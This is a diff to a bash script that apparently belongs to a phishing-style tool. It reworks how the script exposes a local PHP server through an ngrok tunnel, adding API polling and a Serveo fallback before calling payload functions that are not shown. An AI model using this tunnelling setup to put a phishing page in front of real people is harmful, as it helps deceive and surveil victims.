@@ -331,23 +331,84 @@ fi
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server (localhost:3333)...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok tunnel...\n"
-./ngrok http 3333 > /dev/null 2>&1 &
-sleep 10
 
-link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"https://[^\"]*' | head -n1 | cut -d'"' -f4)
-if [[ -z "$link" ]]; then
-	link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/\"]*' | head -n1)
-fi
-if [[ -z "$link" ]]; then
-printf "\e[1;31m[!] Direct link is not generating, check following possible reason lahh  \e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid lu mah\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on alamakkk\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok lah lumah\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection Modal Dulu Bos\n"
-exit 1
+# Choose ngrok executable: prefer local ./ngrok, otherwise system ngrok
+if [[ -x "./ngrok" ]]; then
+	NGROK_CMD="./ngrok"
+elif has_cmd ngrok; then
+	NGROK_CMD="ngrok"
 else
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+	NGROK_CMD=""
+fi
+
+if [[ -n "$NGROK_CMD" ]]; then
+	printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok tunnel using %s...\n" "$NGROK_CMD"
+	$NGROK_CMD http 3333 > /dev/null 2>&1 &
+	# Poll ngrok local API for a public url (up to 20s)
+	link=""
+	attempts=0
+	until [[ -n "$link" || $attempts -ge 20 ]]; do
+		sleep 1
+		# try to extract public_url field
+		api_json=$(curl -s --max-time 1 http://127.0.0.1:4040/api/tunnels 2>/dev/null || true)
+		if [[ -n "$api_json" ]]; then
+			# primary parse: look for public_url
+			link=$(echo "$api_json" | grep -o '"public_url":"https://[^\\\"]*' | head -n1 | cut -d'"' -f4 || true)
+			if [[ -z "$link" ]]; then
+				# fallback: any https url
+				link=$(echo "$api_json" | grep -o 'https://[^/\\\"]*' | head -n1 || true)
+			fi
+		fi
+		attempts=$((attempts+1))
+	done
+	if [[ -n "$link" ]]; then
+		printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
+	else
+		printf "\e[1;31m[!] Ngrok did not return a public URL after polling.\e[0m\n"
+		printf "\e[1;92m[\e[0m*\e[1;92m] Possible reasons:\e[0m\n"
+		printf " - Ngrok failed to start or invalid authtoken\n"
+		printf " - Port 3333 is in use or blocked\n"
+		printf " - No internet connection or firewall\n"
+		# If there is a sendlink (serveo/ssh) output, show it for debugging
+		if [[ -f "sendlink" ]]; then
+			printf "\n\e[1;93m[Debug] Contents of sendlink (serveo/ssh output):\e[0m\n"
+			sed -n '1,120p' sendlink || true
+			printf "\n"
+			# try to extract a serveo URL from sendlink
+			serveo_url=$(grep -o 'https://[^ ]*serveo[^ ]*' sendlink | head -n1 || true)
+			if [[ -n "$serveo_url" ]]; then
+				printf "\e[1;92m[\e[0m*\e[1;92m] Serveo link detected:\e[0m\e[1;77m %s\e[0m\n" "$serveo_url"
+				link="$serveo_url"
+			fi
+		fi
+		# final fallback: fail with clear message
+		if [[ -z "$link" ]]; then
+			printf "\e[1;31m[!] Direct link generation failed. See above messages for troubleshooting.\e[0m\n"
+			exit 1
+		fi
+	fi
+else
+	# No ngrok binary; check if sendlink has serveo output
+	printf "\e[1;93m[!] ngrok executable not found. Falling back to Serveo output if present.\e[0m\n"
+	if [[ -f "sendlink" ]]; then
+		serveo_url=$(grep -o 'https://[^ ]*serveo[^ ]*' sendlink | head -n1 || true)
+		if [[ -n "$serveo_url" ]]; then
+			printf "\e[1;92m[\e[0m*\e[1;92m] Serveo link detected:\e[0m\e[1;77m %s\e[0m\n" "$serveo_url"
+			link="$serveo_url"
+		else
+			# try broader match (serveousercontent etc.)
+			serveo_url=$(grep -o 'https://[^ ]*serveousercontent[^ ]*' sendlink | head -n1 || true)
+			if [[ -n "$serveo_url" ]]; then
+				printf "\e[1;92m[\e[0m*\e[1;92m] Serveo content URL detected:\e[0m\e[1;77m %s\e[0m\n" "$serveo_url"
+				link="$serveo_url"
+			fi
+		fi
+	fi
+	if [[ -z "$link" ]]; then
+		printf "\e[1;31m[!] No tunneling binary found and no Serveo output detected. Install ngrok or use Serveo.\e[0m\n"
+		exit 1
+	fi
+fi
 fi
 payload_ngrok
 checkfound
